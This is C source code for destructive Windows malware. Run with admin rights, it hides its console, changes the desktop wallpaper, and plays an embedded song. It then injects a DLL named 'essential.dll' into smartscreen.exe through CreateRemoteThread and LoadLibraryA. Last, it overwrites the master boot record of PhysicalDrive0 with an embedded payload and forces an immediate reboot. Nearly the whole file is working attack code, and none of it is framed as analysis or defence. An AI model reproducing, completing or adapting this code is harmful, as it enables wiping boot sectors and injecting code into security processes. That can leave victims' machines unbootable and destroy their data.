#include <windows.h>

#include <mmsystem.h>
#include <shlobj.h>
#include <tlhelp32.h>
#include <wincon.h>
#include <winnt.h>
#include <winreg.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define process_to_inject "smartscreen.exe"

// < RESOURCES : include/resource >
extern unsigned char wallpaper_jpg[];
extern int wallpaper_jpg_len;

extern unsigned char song_wav[];
extern int song_wav_len;

extern unsigned char mbr_asm[];
extern int mbr_asm_len;

DWORD injected_pid;

// ; current_path + arg ;
void _join_path(char *dest, char *src) {
  char currentDir[260];
  GetCurrentDirectoryA(sizeof(currentDir), currentDir);
  strcpy(dest, currentDir);

  strcat(dest, "\\");
  strcat(dest, src);
}

void _mbr_overwriting() {
  // > MBR overwriting <
  HANDLE hMbr = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
                            FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
                            OPEN_EXISTING, 0, NULL);

  WriteFile(hMbr, mbr_asm, mbr_asm_len, NULL, NULL);

  CloseHandle(hMbr);

  // > Reboot <
  system("shutdown /r /f /c Bye! /t 0");
}

DWORD GetProcessIdByName(const char *processName) {
  HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  if (hSnapshot == INVALID_HANDLE_VALUE) {
    return 0;
  }

  PROCESSENTRY32 pe32;

  pe32.dwSize = sizeof(PROCESSENTRY32);

  if (!Process32First(hSnapshot, &pe32)) {
    CloseHandle(hSnapshot);
    return 0;
  }

  do {
    if (strcmp(pe32.szExeFile, processName) == 0) {
      CloseHandle(hSnapshot);
      return pe32.th32ProcessID;
    }
  } while (Process32Next(hSnapshot, &pe32));

  CloseHandle(hSnapshot);
  return 0;
}

int ProcessInjection(char *process_name, char dll_path[],
                     unsigned int dll_len) {

  // > Get PID by name <
  injected_pid = GetProcessIdByName(process_name);
  HANDLE processHandle;
  PVOID rbuff;

  HMODULE kernel32 = GetModuleHandle("Kernel32");
  VOID *lb = GetProcAddress(kernel32, "LoadLibraryA");

  if (!injected_pid) {
    return 1;
  }

  // == [ Starting process injection ] ==
  processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, injected_pid);

  // > Allocate memory buffer for remote process <
  rbuff = VirtualAllocEx(processHandle, NULL, dll_len,
                         (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

  WriteProcessMemory(processHandle, rbuff, dll_path, dll_len, NULL);

  // > Our process start new thread <
  rbuff = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)lb,
                             rbuff, 0, NULL);
  CloseHandle(processHandle);

  return 0;
}

void CheckProcinjIsRunning() {
  if (!injected_pid) {
    return;
  }

  HANDLE process = OpenProcess(SYNCHRONIZE, FALSE, injected_pid);
  WaitForSingleObject(process, 25000);

  CloseHandle(process);
}

int Underground() {
  char wallpaper_path[260];

  _join_path(wallpaper_path, "wallpaper.jpg");

  FILE *wallpaper_fopen = fopen(wallpaper_path, "wb");
  fwrite(wallpaper_jpg, sizeof(char), wallpaper_jpg_len, wallpaper_fopen);

  fclose(wallpaper_fopen);

  // > Change wallapaper - `wallpaper_path` <
  SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, TEXT(wallpaper_path),
                       SPIF_UPDATEINIFILE);

  PlaySoundA((LPCSTR)song_wav, NULL, SND_MEMORY | SND_ASYNC);

  return 0;
}

int main() {
  // > Hide application <
  ShowWindow(GetConsoleWindow(), SW_HIDE);

  // > Check if runned by admin <
  if (!IsUserAnAdmin()) {
    MessageBoxA(NULL, TEXT("Run it with admin permissions :3"),
                TEXT("! READ !"), MB_ICONERROR);
    return 1;
  }

  char dll_path[260];

  _join_path(dll_path, "essential.dll");

  MessageBox(NULL, "CATCH ME!!", "Tip: Process injection :D",
             MB_OK | MB_ICONWARNING);

  Underground();

  // > Wait starting music <
  Sleep(2000);

  ProcessInjection(process_to_inject, dll_path, sizeof(dll_path) + 1);

  CheckProcinjIsRunning();

  _mbr_overwriting();

  return 0;
}
